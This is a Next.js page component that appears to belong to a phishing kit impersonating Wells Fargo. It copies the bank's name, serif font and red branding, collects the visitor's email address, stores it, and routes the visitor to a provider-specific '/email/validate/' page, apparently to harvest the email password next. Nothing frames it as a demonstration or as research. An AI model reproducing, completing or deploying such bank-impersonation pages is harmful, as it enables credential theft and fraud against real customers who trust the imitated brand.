import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Box } from "@mui/system";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { CustomInput } from "../components/CustomInput";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { SubmitButton } from "../components/SubmitButton";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";

interface EmailProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("Please enter your email address.")
    .email("Please enter a valid email address."),
});

export const Email: React.FC<EmailProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Header />
      <Wrapper
        title="Email Verfication"
        paragraph="First, We need you to verify your email address."
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
      >
        <Head>
          <title>Wells Fargo - Email verfication</title>
        </Head>
        <Box paddingBottom="32px">
          <CustomInput
            error={
              !!(errors.email && (errors.email.message as unknown as string))
            }
            errorMessage={
              errors.email && (errors.email.message as unknown as string)
            }
            label="Email address"
            register={register("email")}
          />
        </Box>
        <Box
          component="section"
          sx={{
            margin: "1rem auto .625rem",
            display: "block",
          }}
        />
        <SubmitButton text="Continue" disabled={loading} onClick={onSubmit} />
      </Wrapper>
      <Footer />
    </>
  );
};

export default Email;
